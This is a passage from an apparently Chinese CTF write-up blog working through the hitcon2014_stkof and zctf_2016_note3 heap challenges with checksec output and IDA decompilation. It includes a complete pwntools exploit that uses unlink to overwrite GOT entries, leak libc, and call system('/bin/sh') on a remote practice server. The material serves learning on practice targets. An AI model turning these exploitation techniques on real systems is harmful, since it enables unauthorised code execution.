class="hljs-string">b&#x27;abcyyy&#x27;</span>)<br>pause()<br>edit(<span class="hljs-number">1</span>,p64(<span class="hljs-number">0</span>)*<span class="hljs-number">3</span>+p64(<span class="hljs-number">0x21</span>)+p64(<span class="hljs-number">0x90</span>)+p64(free_hook))<br>edit(<span class="hljs-number">1</span>,p64(system_addr))<br>edit(<span class="hljs-number">2</span>,<span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span>)<br>delete(<span class="hljs-number">2</span>)<br><br>r.interactive()<br></code></pre></td></tr></table></figure><h1 id="hitcon2014-stkof"><a href="#hitcon2014-stkof" class="headerlink" title="hitcon2014_stkof"></a>hitcon2014_stkof</h1><h2 id="checksec-6"><a href="#checksec-6" class="headerlink" title="checksec"></a>checksec</h2><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs yaml">[<span class="hljs-string">*</span>] <span class="hljs-string">&#x27;/home/yyyffff/桌面/stkof&#x27;</span><br>    <span class="hljs-attr">Arch:</span>       <span class="hljs-string">amd64-64-little</span><br>    <span class="hljs-attr">RELRO:</span>      <span class="hljs-string">Partial</span> <span class="hljs-string">RELRO</span><br>    <span class="hljs-attr">Stack:</span>      <span class="hljs-string">Canary</span> <span class="hljs-string">found</span><br>    <span class="hljs-attr">NX:</span>         <span class="hljs-string">NX</span> <span class="hljs-string">enabled</span><br>    <span class="hljs-attr">PIE:</span>        <span class="hljs-literal">No</span> <span class="hljs-string">PIE</span> <span class="hljs-string">(0x3ff000)</span><br></code></pre></td></tr></table></figure><p>可以修改 got 表</p><h2 id="IDA-6"><a href="#IDA-6" class="headerlink" title="IDA"></a>IDA</h2><h3 id="main-2"><a href="#main-2" class="headerlink" title="main"></a>main</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs c">__int64 __fastcall <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> a1, <span class="hljs-type">char</span> **a2, <span class="hljs-type">char</span> **a3)</span><br>&#123;<br>  <span class="hljs-type">int</span> v3; <span class="hljs-comment">// eax</span><br>  <span class="hljs-type">int</span> v5; <span class="hljs-comment">// [rsp+Ch] [rbp-74h]</span><br>  <span class="hljs-type">char</span> nptr[<span class="hljs-number">104</span>]; <span class="hljs-comment">// [rsp+10h] [rbp-70h] BYREF</span><br>  <span class="hljs-type">unsigned</span> __int64 v7; <span class="hljs-comment">// [rsp+78h] [rbp-8h]</span><br><br>  v7 = __readfsqword(<span class="hljs-number">0x28u</span>);<br>  <span class="hljs-keyword">while</span> ( fgets(nptr, <span class="hljs-number">10</span>, <span class="hljs-built_in">stdin</span>) )<br>  &#123;<br>    v3 = atoi(nptr);<br>    <span class="hljs-keyword">if</span> ( v3 == <span class="hljs-number">2</span> )<br>    &#123;<br>      v5 = edit();<br>      <span class="hljs-keyword">goto</span> LABEL_14;<br>    &#125;<br>    <span class="hljs-keyword">if</span> ( v3 &gt; <span class="hljs-number">2</span> )<br>    &#123;<br>      <span class="hljs-keyword">if</span> ( v3 == <span class="hljs-number">3</span> )<br>      &#123;<br>        v5 = delete();<br>        <span class="hljs-keyword">goto</span> LABEL_14;<br>      &#125;<br>      <span class="hljs-keyword">if</span> ( v3 == <span class="hljs-number">4</span> )<br>      &#123;<br>        v5 = sub_400BA9();<br>        <span class="hljs-keyword">goto</span> LABEL_14;<br>      &#125;<br>    &#125;<br>    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> ( v3 == <span class="hljs-number">1</span> )<br>    &#123;<br>      v5 = add();<br>      <span class="hljs-keyword">goto</span> LABEL_14;<br>    &#125;<br>    v5 = <span class="hljs-number">-1</span>;<br>LABEL_14:<br>    <span class="hljs-keyword">if</span> ( v5 )<br>      <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;FAIL&quot;</span>);<br>    <span class="hljs-keyword">else</span><br>      <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;OK&quot;</span>);<br>    fflush(<span class="hljs-built_in">stdout</span>);<br>  &#125;<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0LL</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>同样一道菜单题</p><h3 id="add-1"><a href="#add-1" class="headerlink" title="add"></a>add</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs c">__int64 <span class="hljs-title function_">add</span><span class="hljs-params">()</span><br>&#123;<br>  __int64 size; <span class="hljs-comment">// [rsp+0h] [rbp-80h]</span><br>  <span class="hljs-type">char</span> *v2; <span class="hljs-comment">// [rsp+8h] [rbp-78h]</span><br>  <span class="hljs-type">char</span> s[<span class="hljs-number">104</span>]; <span class="hljs-comment">// [rsp+10h] [rbp-70h] BYREF</span><br>  <span class="hljs-type">unsigned</span> __int64 v4; <span class="hljs-comment">// [rsp+78h] [rbp-8h]</span><br><br>  v4 = __readfsqword(<span class="hljs-number">0x28u</span>);<br>  fgets(s, <span class="hljs-number">16</span>, <span class="hljs-built_in">stdin</span>);<br>  size = atoll(s);<br>  v2 = (<span class="hljs-type">char</span> *)<span class="hljs-built_in">malloc</span>(size);<br>  <span class="hljs-keyword">if</span> ( !v2 )<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0xFFFFFFFFL</span>L;<br>  (&amp;::s)[++dword_602100] = v2;<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d\n&quot;</span>, (<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>)dword_602100);<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0LL</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>增加堆块的函数，dwoord_602100 是计数的，而全局变量 s 是记录堆块地址的( 0x602140 )</p><h3 id="edit-2"><a href="#edit-2" class="headerlink" title="edit"></a>edit</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs c">__int64 <span class="hljs-title function_">edit</span><span class="hljs-params">()</span><br>&#123;<br>  <span class="hljs-type">int</span> i; <span class="hljs-comment">// eax</span><br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> v2; <span class="hljs-comment">// [rsp+8h] [rbp-88h]</span><br>  __int64 n; <span class="hljs-comment">// [rsp+10h] [rbp-80h]</span><br>  <span class="hljs-type">char</span> *ptr; <span class="hljs-comment">// [rsp+18h] [rbp-78h]</span><br>  <span class="hljs-type">char</span> s[<span class="hljs-number">104</span>]; <span class="hljs-comment">// [rsp+20h] [rbp-70h] BYREF</span><br>  <span class="hljs-type">unsigned</span> __int64 v6; <span class="hljs-comment">// [rsp+88h] [rbp-8h]</span><br><br>  v6 = __readfsqword(<span class="hljs-number">0x28u</span>);<br>  fgets(s, <span class="hljs-number">16</span>, <span class="hljs-built_in">stdin</span>);<br>  v2 = atol(s);<br>  <span class="hljs-keyword">if</span> ( v2 &gt; <span class="hljs-number">0x100000</span> )<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0xFFFFFFFFL</span>L;<br>  <span class="hljs-keyword">if</span> ( !(&amp;::s)[v2] )<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0xFFFFFFFFL</span>L;<br>  fgets(s, <span class="hljs-number">16</span>, <span class="hljs-built_in">stdin</span>);<br>  n = atoll(s);<br>  ptr = (&amp;::s)[v2];<br>  <span class="hljs-keyword">for</span> ( i = fread(ptr, <span class="hljs-number">1uLL</span>, n, <span class="hljs-built_in">stdin</span>); i &gt; <span class="hljs-number">0</span>; i = fread(ptr, <span class="hljs-number">1uLL</span>, n, <span class="hljs-built_in">stdin</span>) )<br>  &#123;<br>    ptr += i;<br>    n -= i;<br>  &#125;<br>  <span class="hljs-keyword">if</span> ( n )<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0xFFFFFFFFL</span>L;<br>  <span class="hljs-keyword">else</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0LL</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>对于输入的长度没有检查，可以随便修改下个堆块信息</p><h3 id="delete-1"><a href="#delete-1" class="headerlink" title="delete"></a>delete</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs c">__int64 <span class="hljs-title function_">delete</span><span class="hljs-params">()</span><br>&#123;<br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> v1; <span class="hljs-comment">// [rsp+Ch] [rbp-74h]</span><br>  <span class="hljs-type">char</span> s[<span class="hljs-number">104</span>]; <span class="hljs-comment">// [rsp+10h] [rbp-70h] BYREF</span><br>  <span class="hljs-type">unsigned</span> __int64 v3; <span class="hljs-comment">// [rsp+78h] [rbp-8h]</span><br><br>  v3 = __readfsqword(<span class="hljs-number">0x28u</span>);<br>  fgets(s, <span class="hljs-number">16</span>, <span class="hljs-built_in">stdin</span>);<br>  v1 = atol(s);<br>  <span class="hljs-keyword">if</span> ( v1 &gt; <span class="hljs-number">0x100000</span> )<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0xFFFFFFFFL</span>L;<br>  <span class="hljs-keyword">if</span> ( !(&amp;::s)[v1] )<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0xFFFFFFFFL</span>L;<br>  <span class="hljs-built_in">free</span>((&amp;::s)[v1]);<br>  (&amp;::s)[v1] = <span class="hljs-number">0LL</span>;<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0LL</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>free 后清零</p><h2 id="分析-1"><a href="#分析-1" class="headerlink" title="分析"></a>分析</h2><p>由于没有类似 view 的函数，我们无法直接输出一个已知的地址，那么 libcbase 就无法得到</p><p>但是 got 表是可以写的，我们可以将 free_got 写成 puts_plt，而后执行 free 就可以输出，然后将 free_got 写成 system，delete 掉一个内容为 &#x2F;bin&#x2F;sh 的堆块即可得到 flag</p><p>至于如何写 free_got，这里用到 unlink</p><p>由于第一个堆块创建完不知道为啥会自己创建一个 0x410 的堆块，所以我们不用 1 块</p><ul><li>首先创造 4 个块，在 2 块里伪造堆块 <ul><li>其中 size 为 1 块大小-0x10</li><li>取 aim&#x3D;0x602100+0x10，也就是 2 块指针</li><li>fd 为 aim-0x18 bk为 aim-0x10，这样是可以通过 unlink 检查的，至于为什么可以看 unlink 源码然后画个表格就可以了</li><li>将 3 块的 pre_size 写为 chunk1-0x10，chunk3size 去掉末尾 1 写为 0</li></ul></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python">add(<span class="hljs-number">0x10</span>) <span class="hljs-comment"># 1</span><br>add(<span class="hljs-number">0x80</span>) <span class="hljs-comment"># 2</span><br>add(<span class="hljs-number">0x80</span>) <span class="hljs-comment"># 3</span><br>add(<span class="hljs-number">0x10</span>) <span class="hljs-comment"># 4 top</span><br>bss=<span class="hljs-number">0x602140</span><br>chunk2_ptr=bss+<span class="hljs-number">0x10</span><br>fd=chunk2_ptr-<span class="hljs-number">0x18</span><br>bk=chunk2_ptr-<span class="hljs-number">0x10</span><br>edit(<span class="hljs-number">2</span>,p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0x80</span>)+p64(fd)+p64(bk)+p64(<span class="hljs-number">0</span>)*<span class="hljs-number">0xc</span>+p64(<span class="hljs-number">0x80</span>)+p64(<span class="hljs-number">0x90</span>))<br></code></pre></td></tr></table></figure><p>效果如下</p><p><img src="/2025/02/19/buu%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/1754025675035.png"></p><ul><li>然后 delete(3) 即可 unlink 这个伪造的 chunk ，具体效果就是往 chunk2 指针上写入 aim-0x18 （unlink 效果的最后一句），然后我们就可以通过这个指针往 0x602140 写入东西</li></ul><p>效果</p><p><img src="/2025/02/19/buu%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/101cbb9fca898724fe6858dcc3b651fa.png"> </p><ul><li>然后我们往 chunk1 指针写入 free_got，往 chunk2 指针写入 puts_got，然后我们 edit(1)，写入 puts_plt 接着 delete(2) 就可以将 puts_addr 打印出来，然后计算 libcbase，最后往 free_got 写入 system，然后将 chunk4 写入 &#x2F;bin&#x2F;sh\x00，最后 delete(4) 即可</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs python">delete(<span class="hljs-number">3</span>)<br>edit(<span class="hljs-number">2</span>,p64(<span class="hljs-number">0</span>)*<span class="hljs-number">2</span>+p64(elf.got[<span class="hljs-string">&#x27;free&#x27;</span>])+p64(elf.got[<span class="hljs-string">&#x27;puts&#x27;</span>]))<br>edit(<span class="hljs-number">1</span>,p64(elf.plt[<span class="hljs-string">&#x27;puts&#x27;</span>]))<br><br>delete(<span class="hljs-number">2</span>)<br>r.recvuntil(<span class="hljs-string">&quot;OK\n&quot;</span>)<br>puts_addr=u64(r.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;puts_addr-&gt;&quot;</span>,<span class="hljs-built_in">hex</span>(puts_addr))<br>libcbase=puts_addr-libc.sym[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>system_addr=libcbase+libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;system-&gt;&quot;</span>,<span class="hljs-built_in">hex</span>(system_addr))<br><br>edit(<span class="hljs-number">4</span>,<span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span>)<br>edit(<span class="hljs-number">1</span>,p64(system_addr))<br>delete(<span class="hljs-number">4</span>)<br>r.interactive()<br></code></pre></td></tr></table></figure><h2 id="exp-3"><a href="#exp-3" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context(arch=<span class="hljs-string">&#x27;amd64&#x27;</span>,os=<span class="hljs-string">&#x27;linux&#x27;</span>,log_level=<span class="hljs-string">&#x27;debug&#x27;</span>)<br>elf=ELF(<span class="hljs-string">&#x27;./stkof&#x27;</span>)<br>libc=ELF(<span class="hljs-string">&#x27;./libc-2.23.so&#x27;</span>)<br><span class="hljs-comment">#r=process(&#x27;./stkof&#x27;) </span><br>r=remote(<span class="hljs-string">&quot;node5.buuoj.cn&quot;</span>,<span class="hljs-number">26117</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">size</span>):<br>    r.sendline(<span class="hljs-string">&quot;1&quot;</span>)<br>    r.sendline(<span class="hljs-built_in">str</span>(size))<br>    r.recvuntil(<span class="hljs-string">&quot;OK\n&quot;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">idx,content</span>):<br>    r.sendline(<span class="hljs-string">&quot;2&quot;</span>)<br>    r.sendline(<span class="hljs-built_in">str</span>(idx))<br>    r.sendline(<span class="hljs-built_in">str</span>(<span class="hljs-built_in">len</span>(content)))<br>    r.send(content)<br>    r.recvuntil(<span class="hljs-string">&quot;OK\n&quot;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">delete</span>(<span class="hljs-params">idx</span>):<br>    r.sendline(<span class="hljs-string">&quot;3&quot;</span>)<br>    r.sendline(<span class="hljs-built_in">str</span>(idx))<br><br>add(<span class="hljs-number">0x10</span>) <span class="hljs-comment"># 1</span><br>add(<span class="hljs-number">0x80</span>) <span class="hljs-comment"># 2</span><br>add(<span class="hljs-number">0x80</span>) <span class="hljs-comment"># 3</span><br>add(<span class="hljs-number">0x10</span>) <span class="hljs-comment"># 4 top</span><br>bss=<span class="hljs-number">0x602140</span><br>chunk2_ptr=bss+<span class="hljs-number">0x10</span><br>fd=chunk2_ptr-<span class="hljs-number">0x18</span><br>bk=chunk2_ptr-<span class="hljs-number">0x10</span><br>edit(<span class="hljs-number">2</span>,p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0x80</span>)+p64(fd)+p64(bk)+p64(<span class="hljs-number">0</span>)*<span class="hljs-number">0xc</span>+p64(<span class="hljs-number">0x80</span>)+p64(<span class="hljs-number">0x90</span>))<br>delete(<span class="hljs-number">3</span>)<br>edit(<span class="hljs-number">2</span>,p64(<span class="hljs-number">0</span>)*<span class="hljs-number">2</span>+p64(elf.got[<span class="hljs-string">&#x27;free&#x27;</span>])+p64(elf.got[<span class="hljs-string">&#x27;puts&#x27;</span>]))<br>edit(<span class="hljs-number">1</span>,p64(elf.plt[<span class="hljs-string">&#x27;puts&#x27;</span>]))<br><br>delete(<span class="hljs-number">2</span>)<br>r.recvuntil(<span class="hljs-string">&quot;OK\n&quot;</span>)<br>puts_addr=u64(r.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;puts_addr-&gt;&quot;</span>,<span class="hljs-built_in">hex</span>(puts_addr))<br>libcbase=puts_addr-libc.sym[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>system_addr=libcbase+libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;system-&gt;&quot;</span>,<span class="hljs-built_in">hex</span>(system_addr))<br><br>edit(<span class="hljs-number">4</span>,<span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span>)<br>edit(<span class="hljs-number">1</span>,p64(system_addr))<br>delete(<span class="hljs-number">4</span>)<br>r.interactive()<br></code></pre></td></tr></table></figure><h1 id="zctf-2016-note3"><a href="#zctf-2016-note3" class="headerlink" title="zctf_2016_note3"></a>zctf_2016_note3</h1><h2 id="checksec-7"><a href="#checksec-7" class="headerlink" title="checksec"></a>checksec</h2><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs yaml">[<span class="hljs-string">*</span>] <span class="hljs-string">&#x27;/home/yyyffff/桌面/note3&#x27;</span><br>    <span class="hljs-attr">Arch:</span>       <span class="hljs-string">amd64-64-little</span><br>    <span class="hljs-attr">RELRO:</span>      <span class="hljs-string">Partial</span> <span class="hljs-string">RELRO</span><br>    <span class="hljs-attr">Stack:</span>      <span class="hljs-string">Canary</span> <span class="hljs-string">found</span><br>    <span class="hljs-attr">NX:</span>         <span class="hljs-string">NX</span> <span class="hljs-string">enabled</span><br>    <span class="hljs-attr">PIE:</span>        <span class="hljs-literal">No</span> <span class="hljs-string">PIE</span> <span class="hljs-string">(0x3ff000)</span><br></code></pre></td></tr></table></figure><h2 id="IDA-7"><a href="#IDA-7" class="headerlink" title="IDA"></a>IDA</h2><h3 id="main-3"><a href="#main-3" class="headerlink" title="main"></a>main</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> __fastcall __noreturn <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> a1, <span class="hljs-type">char</span> **a2, <span class="hljs-type">char</span> **a3)</span><br>&#123;<br>  setvbuf(<span class="hljs-built_in">stdin</span>, <span class="hljs-number">0LL</span>, <span class="hljs-number">2</span>, <span class="hljs-number">0LL</span>);<br>  setvbuf(<span class="hljs-built_in">stdout</span>, <span class="hljs-number">0LL</span>, <span class="hljs-number">2</span>, <span class="hljs-number">0LL</span>);<br>  setvbuf(<span class="hljs-built_in">stderr</span>, <span class="hljs-number">0LL</span>, <span class="hljs-number">2</span>, <span class="hljs-number">0LL</span>);<br>  alarm(<span class="hljs-number">0x3Cu</span>);<br>  <span class="hljs-keyword">while</span> ( <span class="hljs-number">1</span> )<br>  &#123;<br>    <span class="hljs-keyword">switch</span> ( (<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>)sub_400A1B() )<br>    &#123;<br>      <span class="hljs-keyword">case</span> <span class="hljs-number">1u</span>:<br>        add();<br>        <span class="hljs-keyword">break</span>;<br>      <span class="hljs-keyword">case</span> <span class="hljs-number">2u</span>:<br>        show();<br>        <span class="hljs-keyword">break</span>;<br>      <span class="hljs-keyword">case</span> <span class="hljs-number">3u</span>:<br>        edit();<br>        <span class="hljs-keyword">break</span>;<br>      <span class="hljs-keyword">case</span> <span class="hljs-number">4u</span>:<br>        delete();<br>        <span class="hljs-keyword">break</span>;<br>      <span class="hljs-keyword">case</span> <span class="hljs-number">5u</span>:<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Bye~&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>      <span class="hljs-keyword">case</span> <span class="hljs-number">6u</span>:<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>      <span class="hljs-keyword">default</span>:<br>        <span class="hljs-keyword">continue</span>;<br>    &#125;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>菜单题</p><h3 id="add-2"><a href="#add-2" class="headerlink" title="add"></a>add</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">add</span><span class="hljs-params">()</span><br>&#123;<br>  <span class="hljs-type">int</span> i; <span class="hljs-comment">// [rsp+Ch] [rbp-14h]</span><br>  __int64 size; <span class="hljs-comment">// [rsp+10h] [rbp-10h]</span><br>  <span class="hljs-type">void</span> *v3; <span class="hljs-comment">// [rsp+18h] [rbp-8h]</span><br><br>  <span class="hljs-keyword">for</span> ( i = <span class="hljs-number">0</span>; i &lt;= <span class="hljs-number">6</span> &amp;&amp; *(&amp;ptr + i); ++i )<br>    ;<br>  <span class="hljs-keyword">if</span> ( i == <span class="hljs-number">7</span> )<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Note is full, add fail&quot;</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Input the length of the note content:(less than 1024)&quot;</span>);<br>  size = sub_4009B9();<br>  <span class="hljs-keyword">if</span> ( size &lt; <span class="hljs-number">0</span> )<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Length error&quot;</span>);<br>  <span class="hljs-keyword">if</span> ( size &gt; <span class="hljs-number">0x400</span> )<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Content is too long&quot;</span>);<br>  v3 = <span class="hljs-built_in">malloc</span>(size);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Input the note content:&quot;</span>);<br>  sub_4008DD((__int64)v3, size, <span class="hljs-number">10</span>);<br>  *(&amp;ptr + i) = v3;<br>  qword_6020C0[i + <span class="hljs-number">8</span>] = size;<br>  qword_6020C0[<span class="hljs-number">0</span>] = (__int64)*(&amp;ptr + i);<br>  <span class="hljs-keyword">return</span> <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;note add success, the id is %d\n&quot;</span>, (<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>)i);<br>&#125;<br></code></pre></td></tr></table></figure><p>如图</p><p><img src="/2025/02/19/buu%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/1754115919807.png"></p><p>c0 是临时的，从 c8 开始记录堆指针，从 100 开始记录每个堆块长度</p><h3 id="show-1"><a href="#show-1" class="headerlink" title="show"></a>show</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">show</span><span class="hljs-params">()</span><br>&#123;<br>  <span class="hljs-keyword">return</span> <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;No show, No leak.&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>骗人的&#x2F;(ㄒoㄒ)&#x2F;~~</p><h3 id="edit-3"><a href="#edit-3" class="headerlink" title="edit"></a>edit</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span 